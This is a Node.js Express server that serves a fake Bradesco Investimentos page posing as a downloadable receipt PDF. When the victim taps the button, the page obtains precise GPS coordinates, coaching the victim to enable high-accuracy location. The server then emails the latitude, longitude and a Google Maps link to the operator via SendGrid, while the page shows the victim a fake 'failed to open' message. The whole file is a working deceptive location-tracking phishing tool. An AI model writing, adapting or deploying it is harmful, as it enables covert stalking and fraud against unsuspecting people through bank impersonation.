import express from "express";
import dotenv from "dotenv";
import fetch from "node-fetch";

dotenv.config();

const app = express();
app.use(express.json());

// ✅ Tokens válidos (adicione mais se quiser)
const validTokens = new Set(["ABC123"]);

function must(name) {
  const v = process.env[name];
  if (!v) throw new Error(`Missing env var: ${name}`);
  return v;
}

async function sendEmailSendGrid({ from, to, subject, text }) {
  const apiKey = must("SENDGRID_API_KEY");

  const r = await fetch("https://api.sendgrid.com/v3/mail/send", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${apiKey}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      personalizations: [{ to: [{ email: to }] }],
      from: { email: from },
      subject,
      content: [{ type: "text/plain", value: text }],
    }),
  });

  if (!r.ok) {
    const body = await r.text().catch(() => "");
    throw new Error(`SendGrid API error ${r.status}: ${body}`);
  }
}

app.get("/", (req, res) => res.send("OK"));

app.get("/loc/:token", (req, res) => {
  const { token } = req.params;
  if (!validTokens.has(token)) return res.status(404).send("Link inválido.");

  res.type("html").send(`<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Bradesco Investimentos</title>
</head>
<body style="font-family:Arial; padding:16px; max-width:640px; margin:auto;">
  <h2>Bradesco Investimentos</h2>
 # <p>Toque no botão para abrir o comprovante</p>

  <button id="btn" style="padding:12px 16px; font-size:16px;">comprovante21012026.pdf</button>
  <pre id="out" style="margin-top:16px; white-space:pre-wrap;"></pre>

<script>
  const out = document.getElementById("out");
  const btn = document.getElementById("btn");

  function getPos(options) {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, options);
    });
  }

  btn.onclick = async () => {
    if (!navigator.geolocation) {
      out.textContent = "Geolocalização não suportada.";
      return;
    }

    btn.disabled = true;
    out.textContent = "Abrindo Comprovante...";

    let pos;
    try {
      pos = await getPos({ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
    } catch (e1) {
      out.textContent = "Alta precisão demorou. Tentando modo padrão...";
      try {
        pos = await getPos({ enableHighAccuracy: false, timeout: 20000, maximumAge: 60000 });
      } catch (e2) {
        btn.disabled = false;
        out.textContent =
          "Não foi possível abrir o comprovante. " +
          "Abra em 'Chrome', ative Localização do celular e permita 'Localização precisa'. " +
          "Erro: " + (e2.message || e2);
        return;
      }
    }

    out.textContent = "Enviando...";
    const payload = {
      token: "${token}",
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy,
      ts: Date.now()
    };

    const r = await fetch("/api/location", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload)
    });

    if (r.ok) {
      out.textContent = "Falha na abertura do comprovante ❌";
    } else {
      let msg = "Falha ao enviar ❌ (" + r.status + ")";
      try {
        const data = await r.json();
        if (data && data.error) msg += " - " + data.error;
      } catch (_) {}
      out.textContent = msg;
    }
  };
</script>
</body>
</html>`);
});

app.post("/api/location", async (req, res) => {
  const { token, lat, lon, acc, ts } = req.body || {};
  if (!token || !validTokens.has(token)) return res.status(403).json({ ok: false, error: "invalid_token" });
  if (typeof lat !== "number" || typeof lon !== "number") return res.status(400).json({ ok: false, error: "bad_coords" });

  const maps = `https://www.google.com/maps?q=${lat},${lon}`;
  const when = new Date(ts || Date.now()).toISOString();

  const from = process.env.FROM_EMAIL || must("TO_EMAIL");
  const to = must("TO_EMAIL");

  try {
    await sendEmailSendGrid({
      from,
      to,
      subject: `📍 Localização recebida (${token})`,
      text:
`Token: ${token}
Quando: ${when}
Latitude: ${lat}
Longitude: ${lon}
Precisão: ${acc ?? "n/a"} m
Maps: ${maps}`
    });

    res.json({ ok: true });
  } catch (e) {
    console.error("email_failed", e);
    res.status(500).json({ ok: false, error: "email_failed" });
  }
});

app.listen(process.env.PORT || 3000, "0.0.0.0", () => {
  console.log("Server up");
});

